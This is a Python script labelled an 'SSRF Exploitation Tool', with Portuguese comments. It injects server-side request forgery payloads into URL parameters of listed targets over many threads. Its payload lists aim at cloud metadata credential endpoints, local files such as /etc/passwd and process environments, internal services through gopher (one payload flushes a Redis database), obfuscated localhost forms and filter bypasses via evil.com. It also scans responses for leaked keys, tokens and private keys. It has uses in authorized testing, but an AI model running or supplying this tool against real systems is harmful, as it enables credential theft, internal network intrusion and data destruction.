#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import urllib3
import json
import time
import sys
import os
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, parse_qs, urlencode, unquote
from colorama import Fore, Style, init
import logging
from typing import Dict, List, Optional, Union, Tuple
import argparse
import re
from datetime import datetime
import hashlib
import base64
import random
import uuid
import threading
from concurrent.futures import as_completed

# Configuração inicial
init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class URLProcessor:
    """Classe para processar URLs e preparar requisições"""
    
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]
        
        # Lista completa de parâmetros SSRF
        self.ssrf_params = [
            # Common direct URL parameters
            "url", "uri", "link", "src", "href", "path", "redirect", "return", "next", "goto",
            "redirect_to", "redirect_uri", "callback_url", "return_url", "return_to", "go",
            
            # File and resource loading
            "file", "document", "folder", "root", "page", "feed", "source", "data", 
            "resource", "load", "content", "preview", "view", "download",
            
            # API endpoints and connection params
            "api", "endpoint", "server", "host", "port", "address", "ip", "domain", "site", 
            "service", "location", "region", "zone", "instance", 
            
            # Media related
            "img", "image", "media", "thumbnail", "picture", "audio", "video", "file", "avatar",
            
            # Webhooks and callbacks
            "webhook", "callback", "hook", "subscription", "notify", "notification",
            
            # Less common but exploitable
            "proxy", "dest", "destination", "auth", "open", "navigation", "template", 
            "environment", "target", "base", "referrer", "reference", "ref", "share"
        ]
    
    def load_urls(self, file_path: str) -> List[Dict]:
        """Carrega e processa URLs do arquivo"""
        processed_urls = []
        try:
            with open(file_path, 'r') as f:
                for line in f:
                    url = line.strip()
                    if url:
                        url_data = self.process_url(url)
                        if url_data:
                            processed_urls.append(url_data)
        except Exception as e:
            logging.error(f"Erro ao carregar URLs: {str(e)}")
        return processed_urls
    
    def process_url(self, url: str) -> Optional[Dict]:
        """Processa uma URL e identifica pontos de injeção"""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # Identifica parâmetros que podem ser pontos de injeção
            injection_points = []
            for param, values in params.items():
                if any(keyword in param.lower() for keyword in self.ssrf_params):
                    injection_points.append(param)
            
            return {
                'base_url': url,
                'scheme': parsed.scheme,
                'netloc': parsed.netloc,
                'path': parsed.path,
                'params': params,
                'injection_points': injection_points
            }
        except Exception as e:
            logging.error(f"Erro ao processar URL {url}: {str(e)}")
            return None
    
    def prepare_request(self, url_data: Dict, payload: str, method: str = 'GET', custom_headers: Dict = None) -> Optional[Dict]:
        """Prepara uma requisição com o payload"""
        try:
            # Prepara headers
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'close'
            }
            
            if custom_headers:
                headers.update(custom_headers)
            
            # Se não houver pontos de injeção, tenta injetar no último parâmetro
            if not url_data['injection_points']:
                params = url_data['params']
                if params:
                    last_param = list(params.keys())[-1]
                    url_data['injection_points'] = [last_param]
                else:
                    # Se não houver parâmetros, adiciona um novo
                    url_data['injection_points'] = ['url']
            
            # Prepara URL e dados
            if method == 'GET':
                new_params = url_data['params'].copy()
                for point in url_data['injection_points']:
                    new_params[point] = [payload]
                
                query = urlencode(new_params, doseq=True)
                url = f"{url_data['scheme']}://{url_data['netloc']}{url_data['path']}?{query}"
                return {
                    'method': 'GET',
                    'url': url,
                    'headers': headers
                }
            else:  # POST
                data = {}
                for point in url_data['injection_points']:
                    data[point] = payload
                
                url = f"{url_data['scheme']}://{url_data['netloc']}{url_data['path']}"
                return {
                    'method': 'POST',
                    'url': url,
                    'headers': headers,
                    'data': data
                }
                
        except Exception as e:
            logging.error(f"Erro ao preparar requisição: {str(e)}")
            return None

class ResponseAnalyzer:
    def __init__(self):
        self.sensitive_patterns = [
            # AWS
            r'aws_access_key_id\s*=\s*[A-Z0-9]{20}',
            r'aws_secret_access_key\s*=\s*[A-Za-z0-9/+=]{40}',
            r'AKIA[0-9A-Z]{16}',
            
            # Azure
            r'azure[_-]?key\s*=\s*[A-Za-z0-9+/=]{32,}',
            r'azure[_-]?secret\s*=\s*[A-Za-z0-9+/=]{32,}',
            
            # Google Cloud
            r'AIza[0-9A-Za-z-_]{35}',
            r'[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com',
            
            # Database
            r'mysql[_-]?password\s*=\s*[A-Za-z0-9@#$%^&+=]{8,}',
            r'postgres[_-]?password\s*=\s*[A-Za-z0-9@#$%^&+=]{8,}',
            r'mongodb[_-]?password\s*=\s*[A-Za-z0-9@#$%^&+=]{8,}',
            r'redis[_-]?password\s*=\s*[A-Za-z0-9@#$%^&+=]{8,}',
            
            # API Keys
            r'api[_-]?key\s*=\s*[A-Za-z0-9-_]{32,}',
            r'api[_-]?secret\s*=\s*[A-Za-z0-9-_]{32,}',
            
            # Tokens
            r'bearer\s+[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*',
            r'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*',
            
            # Credenciais
            r'password\s*=\s*[A-Za-z0-9@#$%^&+=]{8,}',
            r'secret\s*=\s*[A-Za-z0-9@#$%^&+=]{8,}',
            r'key\s*=\s*[A-Za-z0-9@#$%^&+=]{8,}',
            r'token\s*=\s*[A-Za-z0-9@#$%^&+=]{8,}',
            r'credential\s*=\s*[A-Za-z0-9@#$%^&+=]{8,}',
            r'private\s*=\s*[A-Za-z0-9@#$%^&+=]{8,}',
            
            # Headers comuns
            r'authorization\s*:\s*[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*',
            r'x-api-key\s*:\s*[A-Za-z0-9-_]{32,}',
            
            # Emails
            r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            
            # IPs
            r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b',
            
            # Hashes
            r'[a-fA-F0-9]{32}',  # MD5
            r'[a-fA-F0-9]{40}',  # SHA1
            r'[a-fA-F0-9]{64}',  # SHA256
            
            # Configurações
            r'config\s*=\s*{[^}]*}',
            r'settings\s*=\s*{[^}]*}',
            r'credentials\s*=\s*{[^}]*}',
            
            # URLs internas
            r'https?://(?:localhost|127\.0\.0\.1|internal|private|dev|staging|test)[^"\s]*',
            
            # Chaves SSH
            r'-----BEGIN (?:RSA|DSA|EC|OPENSSH) PRIVATE KEY-----',
            
            # Certificados
            r'-----BEGIN CERTIFICATE-----',
            
            # Dados de banco
            r'jdbc:[a-z]+://[^:]+:[0-9]+/[^"\s]+',
            r'mongodb://[^:]+:[^@]+@[^:]+:[0-9]+/[^"\s]+',
            r'redis://[^:]+:[^@]+@[^:]+:[0-9]+',
            
            # Variáveis de ambiente
            r'\$[A-Z_]+=[^"\n]+',
            
            # Comentários com credenciais
            r'//\s*(?:password|secret|key|token)\s*[:=]\s*[^\n]+',
            r'#\s*(?:password|secret|key|token)\s*[:=]\s*[^\n]+',
            
            # Logs com dados sensíveis
            r'error.*(?:password|secret|key|token).*[^\n]+',
            r'debug.*(?:password|secret|key|token).*[^\n]+'
        ]
        
    def analyze_response(self, response: requests.Response) -> Dict:
        """Analisa uma resposta HTTP em detalhes"""
        try:
            content = response.text
            headers = dict(response.headers)
            
            # Análise de conteúdo
            content_analysis = {
                "length": len(content),
                "content_type": response.headers.get('content-type', ''),
                "encoding": response.encoding,
                "is_json": self._is_json(content),
                "is_xml": self._is_xml(content),
                "is_html": self._is_html(content),
                "sensitive_data": self._find_sensitive_data(content),
                "status_code": response.status_code,
                "response_time": response.elapsed.total_seconds(),
                "headers": headers,
                "content_hash": self._hash_content(content),
                "content_preview": content[:500] if content else ""
            }
            
            return content_analysis
            
        except Exception as e:
            return {
                "error": str(e),
                "status_code": getattr(response, 'status_code', None)
            }
    
    def _is_json(self, content: str) -> bool:
        try:
            json.loads(content)
            return True
        except:
            return False
    
    def _is_xml(self, content: str) -> bool:
        return content.strip().startswith('<?xml') or content.strip().startswith('<')
    
    def _is_html(self, content: str) -> bool:
        return bool(re.search(r'<html|<body|<div|<p', content, re.I))
    
    def _find_sensitive_data(self, content: str) -> List[Dict]:
        findings = []
        for pattern in self.sensitive_patterns:
            matches = re.finditer(pattern, content, re.I)
            for match in matches:
                value = match.group(0)
                findings.append({
                    "type": pattern,
                    "value": value,
                    "position": match.start()
                })
        return findings
    
    def _hash_content(self, content: str) -> str:
        return hashlib.sha256(content.encode()).hexdigest()

class SSRFPayloads:
    """Classe para gerenciar diferentes tipos de payloads SSRF"""
    
    def __init__(self):
        self.PROTOCOL_VARIATIONS = [
            "http://",
            "hTtPs://",
            "HtTps:/\\/\\",
            "https:/\\",
            "https:",
            "https:/",
            "https:///",
            "http:////",
            "//",
            "http://\\\\",
            "http:\\\\\\\\",
            "https:/%00/",
            "https:/%0A/",
            "https:/%0D/",
            "http:/%09/"
        ]
        
        self.INTERNAL_HOSTS = [
            "127.0.0.1",
            "localhost",
            "[::1]",
            "0.0.0.0",
            "127.1",
            "127.0.0.1:80",
            "127.0.0.1:443",
            "127.0.0.1:22",
            "127.0.0.1:3306",
            "127.0.0.1:5432",
            "127.0.0.1:6379",
            "127.0.0.1:8080",
            "127.0.0.1:8000",
            "127.0.0.1:9000"
        ]
        
        self.OBFUSCATED_HOSTS = [
            "2130706433",
            "0x7f000001",
            "0177.0.0.1",
            "0x7f.0.0.1",
            "127.0.0.0x1",
            "127.1",
            "127.0.1",
            "0",
            "0x0",
            "0300.0250.0.01",
            "0xc0.0xa8.0x0.0x1",
            "❶②⑦.⓪.⓪.⓪①",
            "127.0x00.0x00.0x01",
            "[::]",
            "127.127.127.127",
            "%31%32%37%2E%30%2E%30%2E%31",
            "127.0.0.1%00",
            "127.0.0.1%09",
            "127.0.0.1%0A"
        ]
        
        self.CLOUD_METADATA = [
            "169.254.169.254",
            "169.254.169.254/latest/meta-data/",
            "169.254.169.254/latest/user-data/",
            "169.254.169.254/latest/meta-data/iam/security-credentials/",
            "metadata.google.internal/",
            "metadata.google.internal/computeMetadata/v1/",
            "metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "169.254.169.254/metadata/instance",
            "169.254.169.254/metadata/instance?api-version=2021-02-01",
            "169.254.169.254/metadata/v1/",
            "169.254.169.254/opc/v1/instance/"
        ]
        
        self.PROTOCOL_PAYLOADS = [
            "gopher://127.0.0.1:25/xHELO%20localhost",
            "gopher://127.0.0.1:80/x%47%45%54%20/%20%48%54%54%50/1.1%0A%0A",
            "gopher://127.0.0.1:3306/A",
            "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A",
            "file:///etc/passwd",
            "file:///etc/hosts",
            "file:///proc/self/cmdline",
            "file:///proc/self/environ",
            "file://C:/Windows/win.ini",
            "dict://127.0.0.1:11211/stats",
            "ftp://127.0.0.1",
            "tftp://127.0.0.1",
            "ldap://127.0.0.1",
            "http://127.0.0.1:25"
        ]
        
        self.FILTER_BYPASS = [
            "127.0.0.1:80@evil.com",
            "evil.com@127.0.0.1",
            "127.0.0.1#@evil.com",
            "localhost%23@evil.com",
            "evil.com%2F@127.0.0.1",
            "127.0.0.1/",
            "127.0.0.1:1/",
            "127.0.0.1:80/",
            "127.0.0.1:443/",
            "internal.service/redirect?next=http://127.0.0.1",
            "redirect.com/%2f%2e%2e%2f127.0.0.1",
            f"{uuid.uuid4()}.requestrepo.com",
            "attacker-controlled-domain.com"
        ]
        
        # Agrupa todos os payloads por categoria
        self.payload_categories = {
            'protocol_variations': self.PROTOCOL_VARIATIONS,
            'internal_hosts': self.INTERNAL_HOSTS,
            'obfuscated_hosts': self.OBFUSCATED_HOSTS,
            'cloud_metadata': self.CLOUD_METADATA,
            'protocol_payloads': self.PROTOCOL_PAYLOADS,
            'filter_bypass': self.FILTER_BYPASS
        }
    
    def get_payloads_by_category(self, category: str) -> List[str]:
        """Retorna payloads de uma categoria específica"""
        return self.payload_categories.get(category, [])
    
    def get_all_payloads(self) -> List[str]:
        """Retorna todos os payloads"""
        all_payloads = []
        for category in self.payload_categories.values():
            all_payloads.extend(category)
        return all_payloads
    
    def get_categories(self) -> List[str]:
        """Retorna lista de categorias disponíveis"""
        return list(self.payload_categories.keys())

class SSRFExploiter:
    def __init__(self, config: Dict):
        self.config = config
        self.url_processor = URLProcessor()
        self.payload_manager = SSRFPayloads()
        self.results = []
        self.lock = threading.Lock()
        
        # Configuração do diretório de saída
        self.output_dir = "output"
        self.output_file = os.path.join(self.output_dir, "ssrf_results.json")
        
        # Configuração do proxy
        if self.config.get('proxy'):
            self.proxies = {
                'http': self.config['proxy'],
                'https': self.config['proxy']
            }
        else:
            self.proxies = None
            
        # Configuração de timeout (em milissegundos)
        self.timeout = self.config.get('timeout', 10000) / 1000  # Converte para segundos
        
        # Configuração de verbos HTTP
        self.http_methods = self.config.get('methods', ['GET'])
        
        # Configuração de threads
        self.thread_count = self.config.get('threads', 10)
        self.thread_pool = ThreadPoolExecutor(max_workers=self.thread_count)
        
        # Carrega payloads personalizados se especificado
        self.custom_payloads = []
        if self.config.get('payload_file'):
            self.load_custom_payloads(self.config['payload_file'])
        
        # Inicializa diretório e logging
        self.setup_output_directory()
        self.setup_logging()
    
    def load_custom_payloads(self, payload_file: str):
        """Carrega payloads personalizados de um arquivo"""
        try:
            with open(payload_file, 'r') as f:
                content = f.read()
                if 'FUZZ' not in content:
                    logging.error("Arquivo de payload deve conter a marcação FUZZ")
                    return
                
                # Divide o conteúdo em payloads
                self.custom_payloads = content.split('\n')
                logging.info(f"Carregados {len(self.custom_payloads)} payloads personalizados")
        except Exception as e:
            logging.error(f"Erro ao carregar arquivo de payload: {str(e)}")
    
    def setup_logging(self):
        """Configura o sistema de logging"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(os.path.join(self.output_dir, 'ssrf_exploit.log')),
                logging.StreamHandler()
            ]
        )
    
    def setup_output_directory(self):
        """Configura o diretório de saída e arquivo de resultados"""
        try:
            # Cria diretório output se não existir
            if not os.path.exists(self.output_dir):
                os.makedirs(self.output_dir)
            
            # Inicializa arquivo JSON se não existir
            if not os.path.exists(self.output_file):
                with open(self.output_file, 'w') as f:
                    json.dump({
                        'scan_start_time': datetime.now().isoformat(),
                        'config': self.config,
                        'results': []
                    }, f, indent=4)
        except Exception as e:
            logging.error(f"Erro ao configurar diretório de saída: {str(e)}")
            raise
    
    def save_results(self, results: List[Dict]):
        """Salva resultados no arquivo JSON"""
        try:
            with self.lock:
                # Lê resultados existentes
                with open(self.output_file, 'r') as f:
                    data = json.load(f)
                
                # Adiciona novos resultados
                data['results'].extend(results)
                
                # Atualiza timestamp
                data['last_update'] = datetime.now().isoformat()
                
                # Salva arquivo atualizado
                with open(self.output_file, 'w') as f:
                    json.dump(data, f, indent=4)
                
                logging.info(f"Resultados salvos em {self.output_file}")
        except Exception as e:
            logging.error(f"Erro ao salvar resultados: {str(e)}")
    
    def run_exploitation(self, urls_file: str, custom_headers: Dict = None):
        """Executa a exploração completa"""
        # Carrega URLs
        processed_urls = self.url_processor.load_urls(urls_file)
        if not processed_urls:
            logging.error("Nenhuma URL válida encontrada")
            return
        
        total_results = []
        start_time = time.time()
        
        # Para cada URL
        for url_data in processed_urls:
            logging.info(f"Testando URL: {url_data['base_url']}")
            
            # Para cada categoria de payload
            for category in self.payload_manager.get_categories():
                # Testa com cada método HTTP configurado
                for method in self.http_methods:
                    results = self.test_payload_category(url_data, category, method, custom_headers)
                    with self.lock:
                        total_results.extend(results)
                    
                    # Salva resultados intermediários
                    self.save_results(results)
        
        # Fecha o pool de threads
        self.thread_pool.shutdown()
        
        # Log do tempo total
        total_time = time.time() - start_time
        logging.info(f"Teste concluído em {total_time:.2f} segundos")
        
        # Atualiza arquivo final com estatísticas
        try:
            with open(self.output_file, 'r') as f:
                data = json.load(f)
            
            data['scan_end_time'] = datetime.now().isoformat()
            data['total_duration'] = f"{total_time:.2f} segundos"
            data['total_urls_tested'] = len(processed_urls)
            data['total_payloads_tested'] = len(total_results)
            
            with open(self.output_file, 'w') as f:
                json.dump(data, f, indent=4)
                
            logging.info(f"Relatório final salvo em {self.output_file}")
        except Exception as e:
            logging.error(f"Erro ao salvar relatório final: {str(e)}")
    
    def test_payload(self, url_data: Dict, payload: str, category: str, method: str = 'GET', custom_headers: Dict = None) -> Dict:
        """Testa um payload específico"""
        result = self.url_processor.prepare_request(url_data, payload, method, custom_headers)
        if not result:
            return None
            
        try:
            response = requests.request(
                method=result['method'],
                url=result['url'],
                headers=result['headers'],
                data=result.get('data'),
                verify=False,
                timeout=self.timeout,
                proxies=self.proxies
            )
            
            return {
                'url': result['url'],
                'method': method,
                'payload': payload,
                'category': category,
                'status_code': response.status_code,
                'response_time': response.elapsed.total_seconds(),
                'content_length': len(response.content),
                'headers': dict(response.headers),
                'content': response.text[:500]
            }
            
        except requests.exceptions.Timeout:
            logging.error(f"Timeout ao testar payload {payload} com método {method}")
        except Exception as e:
            logging.error(f"Erro ao testar payload {payload} com método {method}: {str(e)}")
        
        return None
    
    def test_payload_category(self, url_data: Dict, category: str, method: str = 'GET', custom_headers: Dict = None) -> List[Dict]:
        """Testa uma categoria específica de payloads usando threads"""
        results = []
        payloads = self.payload_manager.get_payloads_by_category(category)
        
        logging.info(f"Testando categoria {category} com {len(payloads)} payloads usando método {method}")
        
        # Cria lista de futures para processamento paralelo
        futures = []
        for payload in payloads:
            future = self.thread_pool.submit(
                self.test_payload,
                url_data,
                payload,
                category,
                method,
                custom_headers
            )
            futures.append(future)
        
        # Coleta resultados
        for future in as_completed(futures):
            result = future.result()
            if result:
                with self.lock:
                    results.append(result)
        
        return results

def parse_headers(headers_str: str) -> Dict:
    """Converte string de headers em dicionário"""
    headers = {}
    
    # Tenta primeiro como JSON
    try:
        return json.loads(headers_str)
    except:
        pass
    
    # Se não for JSON, tenta formato HEADER:VALUE
    try:
        for header in headers_str.split(','):
            if ':' in header:
                key, value = header.split(':', 1)
                headers[key.strip()] = value.strip()
    except:
        logging.error("Formato de headers inválido")
        return {}
    
    return headers

def main():
    parser = argparse.ArgumentParser(description='SSRF Exploitation Tool')
    parser.add_argument('-f', '--file', required=True, help='Arquivo com URLs para testar')
    parser.add_argument('-H', '--headers', help='Headers personalizados (JSON ou HEADER:VALUE,HEADER:VALUE)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Número de threads')
    parser.add_argument('-p', '--proxy', help='Proxy para usar nas requisições (ex: http://127.0.0.1:8080)')
    parser.add_argument('--timeout', type=int, default=10000, help='Timeout para requisições em milissegundos')
    parser.add_argument('-m', '--methods', help='Métodos HTTP para testar (ex: GET,POST,HEAD). Padrão: GET')
    parser.add_argument('--payload-file', help='Arquivo com template de payload contendo FUZZ')
    
    args = parser.parse_args()
    
    # Processa métodos HTTP
    methods = ['GET']  # Método padrão
    if args.methods:
        methods = [m.strip().upper() for m in args.methods.split(',')]
        # Valida métodos
        valid_methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'PATCH']
        methods = [m for m in methods if m in valid_methods]
        if not methods:
            logging.warning("Nenhum método HTTP válido especificado. Usando GET como padrão.")
            methods = ['GET']
    
    # Configuração básica
    config = {
        'threads': args.threads,
        'timeout': args.timeout,
        'proxy': args.proxy,
        'methods': methods,
        'payload_file': args.payload_file
    }
    
    # Carrega headers personalizados se fornecidos
    custom_headers = None
    if args.headers:
        custom_headers = parse_headers(args.headers)
    
    # Inicia a exploração
    exploiter = SSRFExploiter(config)
    exploiter.run_exploitation(args.file, custom_headers)

if __name__ == "__main__":
    main()
